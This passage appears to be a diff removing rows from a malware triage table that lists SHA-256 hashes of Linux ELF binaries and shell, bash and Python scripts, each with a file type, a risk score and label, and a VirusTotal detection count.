-| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 54/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `52996f9d9cbdf0ab4c83a465fcea2839e73d3356a298a8e9f7a96cc9b6e70126` | Unknown binary | `52996f9d9cbdf0ab...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 46/100 | 🟡 MEDIUM | **41/75** 🔴 |
-| `5361e27991d07d66fadbf106e4e847f5418be99e4cef7b71b9928e980000dea6` | Unknown binary | `5361e27991d07d66...` | 0/100 | 🟢 LOW | Not in VT |
-| `5492f9606bf12add8b8414b224e8272b7d422baedbd951e8874a4bda0cb716bc` | ELF Binary (Linux executable) (ARM 32-bit) | `5492f9606bf12add...` | 51/100 | 🟡 MEDIUM | **28/75** 🔴 |
-| `561b9327e87addc615ec1c93342af9227faf8bc904218ad513cf86b8ff26a467` | Shell Script | `561b9327e87addc6...` | 59/100 | 🟡 MEDIUM | **23/75** 🔴 |
-| `5752ae9a94cebf686664cdbf5cb88f7c53a1cd70947934a0958992bd98b532f4` | Bash Script | `5752ae9a94cebf68...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `57de376767a78229701434a2efe5d6410132b208417e8d9fc0891405dfc7be09` | ELF Binary (Linux executable) (RISC-V 64-bit) | `57de376767a78229...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `57f23cc6bcf9cc5955922d4d09c854567897e66d550673ce16cd55ff395f1421` | ELF Binary (Linux executable) (AArch64 64-bit) | `57f23cc6bcf9cc59...` | 30/100 | 🟢 LOW | Not in VT |
-| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
-| `586960df8bf559ffbba600f11917a99baed4a875cb7faa5eabc060bcde67277b` | Bash Script | `586960df8bf559ff...` | 76/100 | 🔴 HIGH | **41/75** 🔴 |
-| `588390c5d2115707e120fd4286c61216ca80b02f33610669875083edf1671262` | ELF Binary (Linux executable) (ARM 32-bit) | `588390c5d2115707...` | 70/100 | 🔴 HIGH | Not in VT |
-| `591e135c571321fed659c2d5a763a4685333e2b1bccd35d19e51a1196878c01f` | ELF Binary (Linux executable) (ARM 32-bit) | `591e135c571321fe...` | 84/100 | 🔴 HIGH | **35/75** 🔴 |
-| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
-| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
-| `59efbc56d210575f2f3a4ca620c68650b18911b391f134d0a90a59d212dd7201` | ELF Binary (Linux executable) (x86-64 64-bit) | `59efbc56d210575f...` | 33/100 | 🟢 LOW | **9/75** 🔴 |
-| `5a85f6400740f096bfa7a7bf8ad7439a6c44dee83336701daca96b47c3e1472e` | ELF Binary (Linux executable) (ARM 32-bit) | `5a85f6400740f096...` | 70/100 | 🔴 HIGH | Not in VT |
-| `5b73969e4df42bd57becfd96fdc5ce13873c48995a19a877bf3030e1399fbf2c` | Shell Script | `5b73969e4df42bd5...` | 71/100 | 🔴 HIGH | **3/75** 🔴 |
-| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
-| `5decc8b46b6d027bca1e9f87db87d61c25ad177fe8dbba9bbac611323167fc87` | Unknown binary | `5decc8b46b6d027b...` | 0/100 | 🟢 LOW | Not in VT |
-| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
-| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 65/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `5f5c6ab2eb5b79a9ce1ca4560c7425c9cb6ccb2a37998d9f43217b84247a4c36` | ELF Binary (Linux executable) (x86-64 64-bit) | `5f5c6ab2eb5b79a9...` | 31/100 | 🟢 LOW | **3/75** 🔴 |
-| `603dd8562b98ed7e13618d591a2d359f02a3d33b5b8787435aaa0d06f2bf1451` | Unknown binary | `603dd8562b98ed7e...` | 55/100 | 🟡 MEDIUM | **39/76** 🔴 |
-| `60bd55de5316f67e270f1e4bccc1254748dff438bc41e473735a9d3f497c5773` | ELF Binary (Linux executable) (AArch64 64-bit) | `60bd55de5316f67e...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
-| `60c3986439f423123eeb6e04e04dac447883863fe79dd8b664283cc4d20ec96d` | ELF Binary (Linux executable) (ARM 32-bit) | `60c3986439f42312...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `6137211b79c71309fcfb1688aa91d00b1bbf9f8d0fadd85d7df6fe32632fd4ba` | Bash Script | `6137211b79c71309...` | 61/100 | 🟡 MEDIUM | **29/75** 🔴 |
-| `618bba26ac763cce7c9afea749728f9f676a6c4c8fc47faabeb0bb46f72e1c19` | Unknown binary | `618bba26ac763cce...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
-| `61aeef0d535d309f4bdda6278a7da4ef9d67674a46b619065b88171ee5c0f581` | Bash Script | `61aeef0d535d309f...` | 76/100 | 🔴 HIGH | **40/75** 🔴 |
-| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `62e3e86a7586174df485af5936639769971cfc62fd9d0f2d5385d5bfa61ea88c` | ELF Binary (Linux executable) (ARM 32-bit) | `62e3e86a7586174d...` | 87/100 | 🔴 HIGH | **44/75** 🔴 |
-| `63a93159730be2ed9f0a55773a480911496062ead48fadcb8279d11a35c2810c` | Bash Script | `63a93159730be2ed...` | 50/100 | 🟡 MEDIUM | Not in VT |
-| `649bdd8390fae2adabb07e262d6e01892bdd2c36a36ad70f242bd3bae185b856` | ELF Binary (Linux executable) (x86-64 64-bit) | `649bdd8390fae2ad...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `6540251fd7bdea0a972a7704bb603a5b28c201dc69031d410f91fcf2477bb3fd` | Unknown binary | `6540251fd7bdea0a...` | 0/100 | 🟢 LOW | Not in VT |
-| `659491543493436ba961770938f1ec59a9fdfde6666950f770ac46c03ca987d7` | ELF Binary (Linux executable) (MIPS 32-bit) | `659491543493436b...` | 57/100 | 🟡 MEDIUM | **43/75** 🔴 |
-| `65f241c68881b33c85bff7786a43495627151898e8e36b74f2595aaf1944a438` | ELF Binary (Linux executable) (ARM 32-bit) | `65f241c68881b33c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
-| `6641525ba1231b5af13c06283407a877b7b844af6e52e0075be6bf314d006178` | Unknown binary | `6641525ba1231b5a...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `67db999e9ab18659c1d595c9112ac9b22065cf05328c156585bda8589d10cb70` | ELF Binary (Linux executable) (x86-64 64-bit) | `67db999e9ab18659...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
-| `67e823012241f46e78bf12ced9526ce9719ca21a0a4b3b4f52db62f16e5ec557` | ELF Binary (Linux executable) (ARM 32-bit) | `67e823012241f46e...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `6980031c9f60b74691308715d5fa94fe6265c86d6b2c9b9f41004f41c618dbe8` | ELF Binary (Linux executable) (x86 32-bit) | `6980031c9f60b746...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
-| `698eb8393d55ac1d3e6c2b979a0da5dc297e77a77e656ed198f15d9cb27924b9` | ELF Binary (Linux executable) (x86-64 64-bit) | `698eb8393d55ac1d...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
-| `69c3ce17531000fb71b416fd4f1324a057bcee9ac99180f35fecf32b4091fd9b` | ELF Binary (Linux executable) (x86-64 64-bit) | `69c3ce17531000fb...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
-| `69d2cc6584f3e273192c863f027dc8d618952a6a40e98fac6533aaa060115ab7` | ELF Binary (Linux executable) (x86-64 64-bit) | `69d2cc6584f3e273...` | 46/100 | 🟡 MEDIUM | **41/75** 🔴 |
-| `69d3cbcc7240579772f0192e0ee6e8470d977099f91d2a1c228c5550b1bbc685` | Bash Script | `69d3cbcc72405797...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
-| `69e362be9004c4618c047d1d9c2e707b2e3eeea369c43a0f381ceed794845387` | ELF Binary (Linux executable) (MIPS 32-bit) | `69e362be9004c461...` | 30/100 | 🟢 LOW | Not in VT |
-| `6a7e1676d52a85906d43a543bdb35f8b3282447a5ce8c98dfad33e04afe79dc6` | Bash Script | `6a7e1676d52a8590...` | 65/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `6aa5054a95d23277df417a5f69cf292e19bc2ef0406bc0c1884935a44e3ce797` | Bash Script | `6aa5054a95d23277...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
-| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `6aea9105f7c096dd08f3d7920af28709e437ef99aff5b5c5683e490b03f0157d` | ELF Binary (Linux executable) (MIPS 32-bit) | `6aea9105f7c096dd...` | 57/100 | 🟡 MEDIUM | **44/75** 🔴 |
-| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b` | Bash Script | `6d1fe6ab3cd04ca5...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
-| `6d2b2f72bc45c6276818298de8b5f24140947c808a89c72fcf63d5e48281ada9` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d2b2f72bc45c627...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `6db10684e6288b212081f37b01030db2c45d51c0a04995468db6e8b721ecfae9` | Unknown binary | `6db10684e6288b21...` | 0/100 | 🟢 LOW | Not in VT |
-| `6e094b797206e98a8b1190e485d594230f7efd162b72a2db7231b8b6a7f33075` | Bash Script | `6e094b797206e98a...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
-| `6ef41d3251793644f01d1a20990882ebf15abfb564a5e4001b4aca76242013dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `6ef41d3251793644...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `6f6287e9e363e5457912abb4100053964f28d4d2a0bd3c6046f9035f89022073` | ELF Binary (Linux executable) (ARM 32-bit) | `6f6287e9e363e545...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `701536eb0009ae8a05ef4e5de4b38faf55e86556d75e998cff2d4030537228d1` | ELF Binary (Linux executable) (x86-64 64-bit) | `701536eb0009ae8a...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
-| `71ba701df61f959624cf323e1df2aaedcd48d81bdd55fb04fd7b99dd6e0bef3c` | Bash Script | `71ba701df61f9596...` | 58/100 | 🟡 MEDIUM | **22/75** 🔴 |
-| `7243738e2b27922cd5daed7bb1e9382e87196583976c7a54372f2f149eec3596` | ELF Binary (Linux executable) (x86 32-bit) | `7243738e2b27922c...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
-| `72b4db8a74da275ed7c51ce919e9e8b6d0897c45e50ad8a4bb748a9b681c7ea5` | ELF Binary (Linux executable) (x86-64 64-bit) | `72b4db8a74da275e...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
-| `732e796d24da151af2e4ad54d5706248aefe86686f83e5033c7ca8dd19e97954` | ELF Binary (Linux executable) (ARM 32-bit) | `732e796d24da151a...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
-| `73695282607747038a31f516e3f8310a67ae6f2f9e4a0b90b55a40f77272e559` | ELF Binary (Linux executable) (ARM 32-bit) | `7369528260774703...` | 87/100 | 🔴 HIGH | **44/75** 🔴 |
-| `74c109e455269524e231ea2448820679b25177f1a70935218ac175d775360cdc` | ELF Binary (Linux executable) (ARM 32-bit) | `74c109e455269524...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 46/100 | 🟡 MEDIUM | **42/75** 🔴 |
-| `757a2227b3eccf54c6a904f41a874077c9f2c32d92da9be1ea6385f3011d6ae2` | Bash Script | `757a2227b3eccf54...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
-| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `766c1d6bcb81d3e983fb7adbc19c616d7fc01dafb7893738edc242e2adc59c07` | Unknown binary | `766c1d6bcb81d3e9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `768fa265ab49cb9a2486a04fd03c5ec31fe98111853387f8efd06396fb34af78` | ELF Binary (Linux executable) (x86-64 64-bit) | `768fa265ab49cb9a...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `7720c34f05c646b0c8c69e97d4c9dedb839ee048bc6eee9d064216cbab2649d7` | Unknown binary | `7720c34f05c646b0...` | 0/100 | 🟢 LOW | Not in VT |
-| `773dbd8af231023be6f8d9183e5dcafe78a57550b3050eee11b61d73e82a61d9` | Shell Script | `773dbd8af231023b...` | 76/100 | 🔴 HIGH | **15/74** 🔴 |
-| `7743d51b055f27435d80785e6a677e4c596be622ccae6f6ebc182499e0a75398` | Unknown binary | `7743d51b055f2743...` | 13/100 | 🟢 LOW | **8/75** 🔴 |
-| `7766739193c449206ea63751d23551e2057e4de80f6befaeb7a24eaeb63a5ee1` | ELF Binary (Linux executable) (ARM 32-bit) | `7766739193c44920...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
-| `77ccd5ae0a102102b1c2032ff7f1fa8cc2f1069276f964210e644e1b21d8dd1f` | ELF Binary (Linux executable) (x86-64 64-bit) | `77ccd5ae0a102102...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
-| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `78b37be35efed5a479b8625279049d30b687ad20f090be8e9ec74b773e04544c` | ELF Binary (Linux executable) (ARM 32-bit) | `78b37be35efed5a4...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
-| `79e51db148418ed38457312972f4d2d61773da0d4cb4697cf40a548567630ff7` | Bash Script | `79e51db148418ed3...` | 76/100 | 🔴 HIGH | **40/74** 🔴 |
-| `7a0df7eb5b8d2de00728b7e21e8841b14ce17df2d53da039f163e7abcb0af8cb` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a0df7eb5b8d2de0...` | 35/100 | 🟢 LOW | **14/75** 🔴 |
-| `7a208815a33bd0cdd8c17129108e55bf1a49e8a57846bc53135759bd045bf9e0` | Bash Script | `7a208815a33bd0cd...` | 75/100 | 🔴 HIGH | **38/75** 🔴 |
-| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 87/100 | 🔴 HIGH | **43/75** 🔴 |
-| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
-| `7b1cbba56bb80e185cdf2097f5716c31d7e0f88f28ad7220b3b5a2cf73859ec8` | Bash Script | `7b1cbba56bb80e18...` | 75/100 | 🔴 HIGH | **38/74** 🔴 |
-| `7b5c77e490b373b810ff6039dbd34875618267126ddcddfe3b62b08c7120e298` | Unknown binary | `7b5c77e490b373b8...` | 10/100 | 🟢 LOW | Not in VT |
-| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `7c17196772b0ee593ba0ba4ca0745ae229104528393164daa0deb55a1f931182` | Bash Script | `7c17196772b0ee59...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
-| `7c4924e260187ddf3efc26e2b305fb1ebd333cd15fdb773f37ff3313da732d36` | ELF Binary (Linux executable) (AArch64 64-bit) | `7c4924e260187ddf...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
-| `7d97751f51b65dca7769f83b41fb6bb6c2d694212b69a8b552e0a7bdb00c10f8` | ELF Binary (Linux executable) (ARM 32-bit) | `7d97751f51b65dca...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
-| `7da6e84d862ac4605e50d4293100aa6bac4d57b104001937a791c03ec76724b0` | ELF Binary (Linux executable) (x86-64 64-bit) | `7da6e84d862ac460...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
-| `7e76874a7c3612f333e1dfb68a9d35c111b5f138df4941f7a6005d6c1ebb83bc` | ELF Binary (Linux executable) (ARM 32-bit) | `7e76874a7c3612f3...` | 70/100 | 🔴 HIGH | Not in VT |
-| `7e9b5454e72923f97e7ba34e5b5bba0a7eae2414382e62a17f52e647bf04944c` | Shell Script | `7e9b5454e72923f9...` | 58/100 | 🟡 MEDIUM | **22/75** 🔴 |
-| `7eeb49a12710a14273958e8a5c0594987416ce88d46e57f5c28906d9ff892c1d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7eeb49a12710a142...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
-| `7fd2bd41e693e49cd09260d85864709cc8066f9681b3c2014d9241f128694915` | Shell Script | `7fd2bd41e693e49c...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
-| `8026e59c5c481b8280404ab39e850bb4f412ae43cdd9cfbc8a1dbaa69302903e` | Unknown binary | `8026e59c5c481b82...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
-| `806c1a4193780bbdfdc3db8606747edf12cdc16e8b38e318ed86928c5ce95457` | Python Script | `806c1a4193780bbd...` | 74/100 | 🔴 HIGH | **11/75** 🔴 |
-| `80c21e15e56b4a956a48ab5826a9e389a8aeadc8e42fc7713739a4603e14bdf4` | ELF Binary (Linux executable) (x86-64 64-bit) | `80c21e15e56b4a95...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
-| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 52/100 | 🟡 MEDIUM | **32/75** 🔴 |
-| `80ef3c6e9929ca834a0a4b5ce2f833689a69e32f3748083e215e24dbc72831f1` | ELF Binary (Linux executable) (ARM 32-bit) | `80ef3c6e9929ca83...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
-| `81146865197d28df5f8a7be46f09f980b2eb305edd633b35764b2543f5763e1f` | Bash Script | `81146865197d28df...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
-| `81760addaf68ddd3c15a24e180a2991f6fb4ab330a1650e0a363760cd0c36560` | Shell Script | `81760addaf68ddd3...` | 79/100 | 🔴 HIGH | **24/75** 🔴 |
-| `83b1a2347d0feee81edb14b0794589ecb30f527f4de820dd2e2359f47ded2291` | ELF Binary (Linux executable) (ARM 32-bit) | `83b1a2347d0feee8...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
-| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 46/100 | 🟡 MEDIUM | **41/75** 🔴 |
-| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 62/100 | 🟡 MEDIUM | **31/75** 🔴 |
-| `8600929ff019567828202164c6cd62b08223badc1f6dc7216e3e5dcc5501b3c1` | ELF Binary (Linux executable) (ARM 32-bit) | `8600929ff0195678...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
-| `863225e8f04a5c54ce5e0581241c8c748a838b7962a811b5ffa5d4eea4370d13` | ELF Binary (Linux executable) (MIPS 32-bit) | `863225e8f04a5c54...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
-| `86d8009adfe4e9af331a946e5a750999fd1a5c73be2ac4f5453b731a3ec75932` | Bash Script | `86d8009adfe4e9af...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
-| `86ff9f8a929bf4a61c46da2e2cde2de2cb71f1d6429134c52fad7b82b46e847e` | ELF Binary (Linux executable) (AArch64 64-bit) | `86ff9f8a929bf4a6...` | 30/100 | 🟢 LOW | Not in VT |
-| `87a4e8e1c1056ee839eeb03f5108c87ea9bc4b9bce220ab5002f2853b26044b6` | ELF Binary (Linux executable) (ARM 32-bit) | `87a4e8e1c1056ee8...` | 59/100 | 🟡 MEDIUM | **24/75** 🔴 |
-| `880d44bc4310c80017e14e1ffed543132168d7ec4bd2c8d9a76c82a9ac5368aa` | ELF Binary (Linux executable) (x86-64 64-bit) | `880d44bc4310c800...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `883fcd561a036e47df05454c20c81160ed36df70478af2dc6f0789e98b4a7b54` | ELF Binary (Linux executable) (x86 32-bit) | `883fcd561a036e47...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `885eedb41d5008249366afbedb69879cb793555ed0594b9bfa7f61f0cecfb0c6` | ELF Binary (Linux executable) (ARM 32-bit) | `885eedb41d500824...` | 75/100 | 🔴 HIGH | **37/74** 🔴 |
-| `889f8101436dbf4c3d7bf4a8ed9c399bbacedaaf0c64c731eeebcd2cee6f435b` | Bash Script | `889f8101436dbf4c...` | 66/100 | 🟡 MEDIUM | **16/75** 🔴 |
-| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
-| `8972c09e4cdb63326e05b97d1275591d1eda33ebe9ab4af9717492c751912bf5` | Bash Script | `8972c09e4cdb6332...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
-| `8b19f9f4ebe05047321d306bc3e5485b38fadd28b9dc5a78a522f2c80db7d17c` | ELF Binary (Linux executable) (x86-64 64-bit) | `8b19f9f4ebe05047...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `8bb7c5f5bbdf9d1738a2304d6741ea3613737c563dd5b876e6a89942fa469e10` | ELF Binary (Linux executable) (x86-64 64-bit) | `8bb7c5f5bbdf9d17...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
-| `8c0da2c903eaf8aeeaef90db5ff708313ff807673da59e70edf2a2569d77b332` | ELF Binary (Linux executable) (MIPS 32-bit) | `8c0da2c903eaf8ae...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
-| `8df2346597e0e753d3256cdf100f846664706ce81942531aab44e39a80dd2077` | ELF Binary (Linux executable) (ARM 32-bit) | `8df2346597e0e753...` | 58/100 | 🟡 MEDIUM | **21/75** 🔴 |
-| `8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70` | ELF Binary (Linux executable) (x86 32-bit) | `8e1a67a5c03b3cd8...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `8e5214c220d8b78bb694ec350dbcabaeba5b1597df13805570ff1b6ba17610c1` | ELF Binary (Linux executable) (x86-64 64-bit) | `8e5214c220d8b78b...` | 45/100 | 🟡 MEDIUM | **38/73** 🔴 |
-| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
-| `8ebb41b0bfd24c9f2525723c51b6612aade42f84591e2323417636886774d49a` | ELF Binary (Linux executable) (MIPS 32-bit) | `8ebb41b0bfd24c9f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
-| `8ec920a35a7c6dd60e4aeb3b1ed09cd344f4c5191d4314a05ce72bf757377c86` | ELF Binary (Linux executable) (AArch64 64-bit) | `8ec920a35a7c6dd6...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
-| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/74** 🔴 |
-| `8f96d5a5cd41a687f19e53ba7d9f2dc649227b9d27af957e55c480ea22cb30a3` | Shell Script | `8f96d5a5cd41a687...` | 74/100 | 🔴 HIGH | **10/74** 🔴 |
-| `8ff4ec9fecd2414e0e82ca2807ee983d11ba67a85b4ffe2fa0ac1cbe0679d5fb` | Unknown binary | `8ff4ec9fecd2414e...` | 0/100 | 🟢 LOW | Not in VT |
-| `9066ac0e2cc708b8cf5ced8e5b7d9d754f848c5769521a2db252bf518616ef33` | ELF Binary (Linux executable) (x86-64 64-bit) | `9066ac0e2cc708b8...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
-| `929701008125359f5a4560283c720355cf987868005f48fa8a3df85de1e905f8` | ELF Binary (Linux executable) (x86-64 64-bit) | `929701008125359f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
-| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **30/75** 🔴 |
-| `93d5d6729dc0f5a37aef6763ad24ec250df1a7c91600441920ae30fabc9af85c` | Bash Script | `93d5d6729dc0f5a3...` | 73/100 | 🔴 HIGH | **30/68** 🔴 |
-| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
-| `941efe52eb858311653bf2c1e855555cf735896d500f11ea90aaf7e93d1faa3f` | ELF Binary (Linux executable) (ARM 32-bit) | `941efe52eb858311...` | 87/100 | 🔴 HIGH | **44/75** 🔴 |
-| `945afece38f108d7c1c5c71e785fbf452f7de803ca1f207e6eae1f9dd3d5ae80` | ELF Binary (Linux executable) (ARM 32-bit) | `945afece38f108d7...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
-| `948252b47f283f37068e4df704dc3b426a6f4ca2f9d489785a5b4c219e89bfc3` | ELF Binary (Linux executable) (ARM 32-bit) | `948252b47f283f37...` | 38/100 | 🟢 LOW | **22/75** 🔴 |
-| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
